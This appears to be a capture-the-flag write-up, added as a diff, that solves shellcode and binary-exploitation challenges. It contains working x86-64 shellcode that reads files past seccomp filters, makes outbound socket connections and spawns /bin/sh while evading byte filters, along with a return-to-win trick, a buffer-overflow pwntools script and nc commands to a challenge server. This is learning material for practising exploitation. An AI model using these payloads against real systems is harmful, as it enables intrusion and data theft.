@@ -1,0 +1,655 @@
+cat
+
+$ seccomp-tools dump ./cat.elf  //вначале проверяем разрешения - что мы можем делать с файлом
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
+ 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010 //разрешено
+ 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010 //разрешено
+ 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010 //разрешено
+ 0008: 0x15 0x01 0x00 0x00000003  if (A == close) goto 0010 //разрешено
+ 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
+ 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL
+
+шеллкод должен прочитать флаг
+шеллкод на asm
+
+BITS 64
+
+push 0x02 // значение из  таблицы syscall-ов
+pop rax
+
+lea rdi, [rel + fname]
+xor esi, esi
+xor edx, edx
+syscall
+
+fname:
+db "flag"
+
+
+$ nasm -o cat cat.asm
+
+$ ndisasm -b 64 cat
+00000000  6A02              push byte +0x2
+00000002  58                pop rax
+00000003  488D3D06000000    lea rdi,[rel 0x10]
+0000000A  31F6              xor esi,esi
+0000000C  31D2              xor edx,edx
+0000000E  0F05              syscall
+00000010  2F                db 0x2f
+00000011  666C              o16 insb
+00000013  61                db 0x61
+00000014  67                a32
+
+проверим работу on local:
+$ cat cat | strace ./cat.elf 
+
+...
+open("flag", O_RDONLY)                  = 3 //можем успешно прочитать флаг
+...
+
+BITS 64
+
+sub rsp, 0x70 ; move the stack higher before calling the read, so as not to damage it 
+			  ;(иначе на удаленном сервере наш код повреждает код на стеке и мы не получаем флаг)
+
+push 0x02 ; opening file
+pop rax
+lea rdi, [rel + fname]
+xor esi, esi
+xor edx, edx
+syscall
+
+mov rdi, rax ; reading file
+xor eax, eax
+mov rsi, rsp
+push 0x70
+pop rdx
+syscall
+
+push 1 ; print flad on our terminal
+pop rax
+push 1
+pop rdi
+syscall
+
+fname:
+db "flag"
+
+...
+open("flag", O_RDONLY)                  = 3
+read(3, "{flag_is_here}\n", 112)        = 15
+write(1, "{flag_is_here}\n\0\0\0001\3661\322\17\5H\211\3071\300H\211\346"..., 112{flag_is_here}
+1�1�H��1�H��jpZjXj_flag) = 112
+...
+
+and we get flag
+__________________
+ls_cat
+
+$ seccomp-tools dump ./ls_cat.elf 
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
+ 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011 //разрешено
+ 0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011 //разрешено
+ 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011 //разрешено
+ 0008: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0011 //разрешено
+ 0009: 0x15 0x01 0x00 0x000000d9  if (A == getdents64) goto 0011 //разрешено, (получить записи каталога) 
+ 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x06 0x00 0x00 0x00000000  return KILL
+ 
+BITS 64
+
+;int getdents64(unsigned int fd, struct linux_dirent64 *dirp,
+;             unsigned int count);
+
+push 2 ; opening root ("/")
+pop rax
+lea rdi, [rel + dirname] ; пишем адрес директории
+xor esi, esi
+xor edx, edx
+syscall
+
+mov rdi, rax ; fd to rdi
+sub rsp, 0x1000 ; увеличиваем стек на 4 кб
+mov rsi, rsp ; второй аргумент указывает на стек
+mov rdx, 0x1000
+push 0xd9 ; number of getdents64 syscall 
+pop rax
+syscall
+
+push 1
+pop rax
+push 1 ;нужно писать не в 3й файл, а в 1й (stdout)
+pop rdi
+syscall
+
+int3 ;SIGTRAP instead SIGILL in the end of output strace command
+
+dirname:
+db "/", 0
+
+$ nasm -o ls_cat ls_cat.asm
+$ cat ls_cat | strace ./ls_cat.elf
+прога выводит список файлов
+we get dirty output of root directories and files and get our flag with shellcode from previous task
+
+__________________
+local
+
+localhost:31337. Ты знаешь, что делать...
+nc 109.233.56.90 11666
+
+$ seccomp-tools dump ./local.elf 
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
+ 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011 //we can 
+ 0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011 //we can 
+ 0007: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0011 //we can 
+ 0008: 0x15 0x02 0x00 0x00000029  if (A == socket) goto 0011 //we can 
+ 0009: 0x15 0x01 0x00 0x0000002a  if (A == connect) goto 0011 //we can 
+ 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x06 0x00 0x00 0x00000000  return KILL
+
+ python script for help us
+from pwn import *
+res = b''
+res += p16(2) # AF_INET const
+res += p16(31337, endianness='big')
+res += p8(127) + p8(0) + p8(0) + p8(1)
+print(len(res))
+print(u64(res))
+
+$ python3 helper.py 
+8
+72058141268377602
+
+
+BITS 64
+
+;localhost:31337. Ты знаешь, что делать...
+;nc 109.233.56.90 11666
+
+
+;NR	syscall	references	%rax	arg0(%rdi)	rg1 (%rsi)			arg2 (%rdx)		arg3 (%r10)
+;41	socket	man/ cs/	0x29	int			int					int				-			
+;42	connect	man/ cs/	0x2a	int			struct sockaddr *	int			
+
+;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+
+
+; socket
+push 0x29
+pop rax
+push 2
+pop rdi
+;$ constgrep SOCK_STREAM
+;#define SOCK_STREAM 1
+push 1
+pop rsi
+xor edx, edx
+syscall
+
+; connect
+mov rdi, rax ;нужно сохранить номер файлового дескриптора
+push 0x2a
+pop rax
+
+;struct sockaddr_in {
+;    short            sin_family;   // e.g. AF_INET
+;    unsigned short   sin_port;     // e.g. htons(3490) //htons => big endian
+;    struct in_addr   sin_addr;     // see struct in_addr, below
+;    char             sin_zero[8];  // zero this if you want to
+;};
+xor esi, esi
+push rsi ;sin_zero[8];  // zero this if you want to
+
+mov rsi, 72058141268377602 ; this number for port 31337
+push rsi
+mov rsi, rsp ; adress of stack in rsi now
+push 0x10 ;size of out struct = 16
+pop rdx
+syscall
+
+;now we need to read flag from socket
+xor eax, eax
+push 0x40
+pop rdx
+syscall
+
+;write to stdout
+push 1 ; syscall number 1
+pop rax
+push 1 ; file descriptor number 1
+pop rdi
+syscall
+
+int3
+ 
+ and we get flag
+__________________
+getflag_no_zeroes
+
+Run the shellcode and call /bin/getflag
+nc 109.233.56.90 11669
+
+we need to create shellcode withiou zeroes
+
+BITS 64
+push 0x3b
+pop rax
+xor esi, esi
+xor edi, edi
+lea rdi, [rel + target]
+
+target:
+db "/bin/getflag"
+int3
+
+$ ndisasm -b 64 getflag_no_zeroes
+00000000  6A3B              push byte +0x3b
+00000002  58                pop rax
+00000003  31F6              xor esi,esi
+00000005  31FF              xor edi,edi
+00000007  488D3D00000000    lea rdi,[rel 0xe] -> есть нули
+0000000E  2F                db 0x2f
+0000000F  62                db 0x62
+00000010  696E2F67657466    imul ebp,[rsi+0x2f],dword 0x66746567
+00000017  6C                insb
+00000018  61                db 0x61
+00000019  67CC              a32 int3
+
+>>> "/bin/getflag".ljust(16, "_")
+'/bin/getflag____'
+>>> struct.unpack("QQ", b"/bin/getflag".ljust(16, b"_")) //достается 2 qword-а - 2 раза по 8 байт
+(8387223334460940847, 6872316419751636070)
+
+BITS 64
+;>>> struct.unpack("QQ", b"/bin/getflag".ljust(16, b"_")) ;достается 2 qword-а - 2 раза по 8 байт
+;(8387223334460940847, 6872316419751636070)
+mov rax, 6872316419751636070
+push rax
+mov rax, 8387223334460940847
+push rax
+; execve  0x3b	const char *filename	const char *const *argv		const char *const *envp
+push 0x3b
+pop rax
+xor esi, esi
+xor edi, edi
+int3
+
+$ nasm -o getflag_no_zeroes getflag_no_zeroes.asm 
+$ ndisasm -b 64 getflag_no_zeroes
+00000000  48B8666C61675F5F  mov rax,0x5f5f5f5f67616c66
+         -5F5F
+0000000A  50                push rax
+0000000B  48B82F62696E2F67  mov rax,0x7465672f6e69622f
+         -6574
+00000015  50                push rax
+00000016  6A3B              push byte +0x3b
+00000018  58                pop rax
+00000019  31F6              xor esi,esi
+0000001B  31FF              xor edi,edi
+0000001D  CC                int3
+нулей нет можно продолжать
+/bin/getflag - длина = 12, поэтому по смещению [rsp+12] мы добавляем ноль с помошью xor
+
+BITS 64
+
+;>>> struct.unpack("QQ", b"/bin/getflag".ljust(16, b"_")) ;достается 2 qword-а - 2 раза по 8 байт
+;(8387223334460940847, 6872316419751636070)
+
+mov rax, 6872316419751636070
+push rax
+mov rax, 8387223334460940847
+push rax
+
+xor eax, eax 
+mov [rsp+12], al
+
+; execve  0x3b	const char *filename	const char *const *argv		const char *const *envp
+push 0x3b
+pop rax
+mov rdi, rsp
+xor esi, esi
+xor edi, edi
+syscall
+
+int3
+__________________
+call_fcn_small
+
+Just call win_fcn and make it print flag for you. oh, and now we limited size of your shellcode!
+
+from IDA we get that our shellcode must be 27 bytes:  fread(ptr, 27uLL, 1uLL, stdin);
+  fread(ptr, 0x1BuLL, 1uLL, stdin); - лимит 1B
+  
+  .text:00000000004006B0 win_fcn         proc near
+  ...
+  .text:00000000004006B0 ; __unwind {
+  .text:00000000004006B0                 push    rbp
+  
+BITS 64
+mov rdi, 0xCAFEBABE ;what value to what arg - look in IDA by hovering over variables
+mov rsi, 0x80
+mov rdx, 0x7f
+mov ecx, 0
+mov r8, -1
+call 0x4006B0
+
+не уложились в лимит. маленькие числа можно пушить со стека
+
+BITS 64
+
+mov rdi, 0xCAFEBABE ;what value to what arg - look in IDA by hovering over variables
+;mov rsi, 0x80
+;00000005  BE80000000        mov esi,0x80
+;0000000A  6A7F              push byte +0x7f
+mov esi, edx
+inc esi
+
+push 0x7f ;mov rdx, 0x7f
+pop rdx
+xor ecx, ecx ;mov ecx, 0
+mov r8, -1
+
+push 0x4006B0 ;call 0x4006B0   - уложились в лимит если call (но работает если ret)
+ret
+
+
+$ nasm -o call_fcn_small call_fcn_small.asm 
+$ ndisasm -b 64 call_fcn_small
+
+$ cat call_fcn_small | nc 109.233.56.90 11650 - получаем флаг
+__________________
+characteristic
+
+http://shell-storm.org/shellcode/files/shellcode-905.php - пока что чтобы затестить 
+
+>>> str('\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05')
+'jBX\xfe\xc4H\x99RH\xbf/bin//shWT^I\x89\xd0I\x89\xd2\x0f\x05'
+jBXþÄHRH¿/bin//shWT^IÐIÒ
+
+$ (cat characteristic_asm ; cat)| ./characteristic 
+__________________
+win
+
+FILE *win()
+{
+  FILE *result; // rax
+  char s[72]; // [rsp+0h] [rbp-50h] BYREF
+  FILE *stream; // [rsp+48h] [rbp-8h]
+
+  result = fopen("/flag", "r");
+  stream = result;
+  if ( result )
+  {
+    memset(s, 0, 0x40uLL);
+    fgets(s, 64, stream);
+    fclose(stream);
+    s[strcspn(s, "\r\n")] = 0;
+    printf("Flag is: %s", s);
+    exit(0);
+  }
+  return result;
+}
+//main
+
+.text:000000000000125F                 push    rbp
+.text:0000000000001260                 mov     rbp, rsp
+.text:0000000000001263                 sub     rsp, 16
+.text:0000000000001267                 lea     rax, [rbp+s]
+.text:000000000000126B                 mov     edx, 12         ; n // 12 байт кладется на стек. 12 байт максимально можно ввести
+.text:0000000000001270                 mov     esi, 0          ; c
+.text:0000000000001275                 mov     rdi, rax        ; s
+.text:0000000000001278                 call    _memset
+.text:000000000000127D                 lea     rdi, aShellcode ; "Shellcode: "
+.text:0000000000001284                 mov     eax, 0
+.text:0000000000001289                 call    _printf
+.text:000000000000128E                 lea     rax, [rbp+s]
+.text:0000000000001292                 mov     edx, 0Ch        ; nbytes
+.text:0000000000001297                 mov     rsi, rax        ; buf
+.text:000000000000129A                 mov     edi, 0          ; fd
+.text:000000000000129F                 call    _read
+.text:00000000000012A4                 lea     rdx, [rbp+s]
+.text:00000000000012A8                 mov     eax, 0
+.text:00000000000012AD                 call    rdx // вызывает наш шеллкод.  потом же на стек и прыгаем -> за 12 байт на нужно передать адрес функции win 
+.text:00000000000012AF                 nop // адрес возврата кладется на стек в момент call rdx. 12AF + база бинаря = ret addr - этим и воспользуемся
+.text:00000000000012B0                 leave
+.text:00000000000012B1                 retn
+
+
+$ checksec win.elf
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments -> 
+
+.text:00000000000011C5 ; __unwind {
+
+>>> 0x11C5 - 0x12AF
+-234
+
+BITS 64
+
+;sub qword [rsp], 0x12AF ; getting base
+;add qword [rsp], 0x11C5 ; base addr in rsp now
+; make it instead in python in advance: 0x11C5 - 0x12AF = -234
+;sub qword [rsp], 234 ; also a lot of bytes
+pop rax
+sub rax, 234
+push rax ; 8 bytes it takes
+push rax ; make 16 to align the stack
+ret // прыгаем как раз на функцию win
+
+and we get flag
+__________________
+read_me_not
+
+$ seccomp-tools dump ./read_me_not
+[?] Gimme shellcode:
+aaa
+[+] sys_read forbidden
+[+] sys_write forbidden
+[+] sys_open forbidden
+[-] executing shellcode...
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
+ 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009 //запрещено
+ 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009 //запрещено
+ 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009 //запрещено
+ 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0009: 0x06 0x00 0x00 0x00000000  return KILL
+
+
+через IDA видим, что файл уже открыт
+  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
+  v5 = open("/flag", 0, 0LL);
+  puts("[?] Gimme shellcode:");
+  read(0, buf, 0x1000uLL);
+  
+работает на локальной с поднятым socat, но не работает на удаленном сервере:
+
+BITS 64
+; we cant use read so we use pread64
+; 17	pread64		0x11	unsigned int fd	  char *buf	  size_t count	loff_t pos
+
+;pread
+push 0x11  
+pop rax
+
+mov rsi, rsp; writing buffer to rsi
+push 0x70 ;how much we will read
+pop rdx
+syscall
+
+;pwrite64	0x12	we cant use it because we cant 'seek' 
+;so
+
+; sendto	0x2c
+;%rax	arg0 (%rdi)	arg1 (%rsi)	arg2 (%rdx)	arg3 (%r10)	arg4 (%r8)
+;ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,
+;                     const struct sockaddr *dest_addr, socklen_t addrlen);
+; If sendto() is used on a connection-mode (SOCK_STREAM,
+;       SOCK_SEQPACKET) socket, the arguments dest_addr and addrlen are
+;       ignored 
+
+push 0x2c
+pop rax
+push 1
+pop rdi 
+xor r10, r10 ; flags to zero
+syscall
+int3
+
+этот работает и на локальном с поднятием сокета и на удаленном:
+
+BITS 64
+;			%rax	arg0 (%rdi)	arg1 (%rsi)	arg2 (%rdx)		arg3 (%r10)	arg4 (%r8)
+; sendfile	 0x28	int out_fd	int in_fd	off_t *offset	size_t count
+
+push 0x28
+pop rax
+
+mov rsi, rdi
+push 1
+pop rdi
+
+xor edx, edx
+push 0x70
+pop r10
+
+syscall
+
+$ cat read_me_not_shellcode | nc 109.233.56.90 11613
+[?] Gimme shellcode:
+[+] sys_read forbidden
+[+] sys_write forbidden
+[+] sys_open forbidden
+[-] executing shellcode...
+spbctf{c46a39d485a999fc81d48e2a48b59108}
+__________________
+no_syscall
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  void *buf; // [rsp+30h] [rbp-10h]
+  int v5; // [rsp+3Ch] [rbp-4h]
+
+  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
+  puts("[?] Gimme shellcode:");
+  read(0, buf, 0x1000uLL);
+  puts("[?] Gimme shellcode:");
+  if ( memmem(buf, 0x1000uLL, &unk_402019, 2uLL) ) // memmem is looking for memory in memory
+  {
+    puts("[e] syscall found (0f 05)");
+    v5 = -1;
+  }
+  else
+  {
+    puts("[+] executing shellcode");
+    ((void (__fastcall *)(const char *, __int64))buf)("[+] executing shellcode", 4096LL);
+    v5 = 0;
+  }
+  return v5;
+}
+
+if ( memmem(buf, 0x1000uLL, &unk_402019, 2uLL) ) // memmem is looking for memory in memory
+.rodata:0000000000402019 unk_402019      db  0Fh                 ; DATA XREF: main+7F↑o
+.rodata:000000000040201A                 db    5
+.rodata:000000000040201B                 db    0
+
+its looking for 0f05
+from ndisasm its:
+0000000F  0F05              syscall  -> syscall instruction
+syscall запрещен 
+
+BITS 64
+;		%rax	arg0 (%rdi)				arg1 (%rsi)					arg2 (%rdx)		
+;execve	0x3b	const char *filename	const char *const *argv 	const char *const *envp
+
+mov byte [rel + mysyscall], 0x0f ; push to first int3 
+mov byte [rel + mysyscall+1], 0x05 ; push to second int3
+
+push 0x3b
+pop rax
+lea rdi, [rel + binsh]
+xor esi, esi
+xor edx, edx
+
+mysyscall:
+int3 ;trap to debugger instead of syscall
+int3
+
+binsh:
+db "/bin/sh", 0
+
+and we get shell
+$ (cat no_syscall_asm; cat) | ./no_syscall 
+[?] Gimme shellcode:
+[?] Gimme shellcode:
+[+] executing shellcode
+id
+uid=1001
+__________________
+encoder
+
+переполнение на стеке
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  size_t v3; // rax
+  char s[32]; // [rsp+0h] [rbp-60h] BYREF
+  char buf[40]; // [rsp+20h] [rbp-40h] BYREF
+  double v7; // [rsp+48h] [rbp-18h]
+  clock_t v8; // [rsp+50h] [rbp-10h]
+  clock_t v9; // [rsp+58h] [rbp-8h]
+
+  read(0, buf, 0x400uLL);  // проверку легко обойти, заслав первым байтом ноль байт
+  if ( strlen(buf) > 0x10 )
+  {
+    puts("Eeeeh, are you trying to overflow me?! 16 bytes max!");
+    exit(0);
+  }
+  v9 = clock();
+  encode(buf, s);
+  v8 = clock();
+  v7 = (double)((int)v8 - (int)v9) / 1000000.0;
+  v3 = strlen(s);
+  return printf("%s %d %.4f\n", s, v3, v7);
+}
+
+from pwn import *
+
+# io = process('./encoder')
+io = remote('127.0.0.1', 4000)
+
+pl = b''
+pl += b'\x00'
+pl += cyclic(512)
+io.send(pl)
+io.interactive()
